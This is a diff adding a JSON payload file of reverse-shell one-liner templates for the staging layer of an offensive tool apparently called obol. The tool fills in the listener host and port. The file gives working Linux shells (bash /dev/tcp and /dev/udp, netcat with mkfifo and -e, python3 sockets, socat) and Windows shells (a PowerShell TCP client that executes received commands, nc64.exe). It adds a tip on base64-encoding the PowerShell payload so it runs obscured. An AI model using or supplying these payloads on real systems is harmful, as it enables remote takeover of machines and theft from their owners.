@@ -1,0 +1,16 @@
+{
+  "_note": "Reverse-shell one-liners for the staging layer (§8). Generic, widely published payloads (bash, nc, python, powershell, socat). {{lhost}}/{{lport}} are filled by obol. Project-authored data, not third-party code.",
+  "linux": [
+    {"name": "bash-devtcp", "template": "bash -c 'bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1'"},
+    {"name": "bash-udp", "template": "bash -c 'bash -i >& /dev/udp/{{lhost}}/{{lport}} 0>&1'"},
+    {"name": "nc-mkfifo", "template": "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {{lhost}} {{lport}} >/tmp/f"},
+    {"name": "nc-e", "template": "nc -e /bin/sh {{lhost}} {{lport}}"},
+    {"name": "python3", "template": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{{lhost}}\",{{lport}}));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'"},
+    {"name": "socat", "template": "socat TCP:{{lhost}}:{{lport}} EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane"}
+  ],
+  "windows": [
+    {"name": "powershell-tcp", "template": "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{{lhost}}',{{lport}});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()}\""},
+    {"name": "nc64", "template": "nc64.exe {{lhost}} {{lport}} -e cmd.exe"},
+    {"name": "powershell-b64-note", "template": "# base64-encode the powershell-tcp payload with: echo -n '<payload>' | iconv -t UTF-16LE | base64 -w0  then run: powershell -e <b64>"}
+  ]
+}
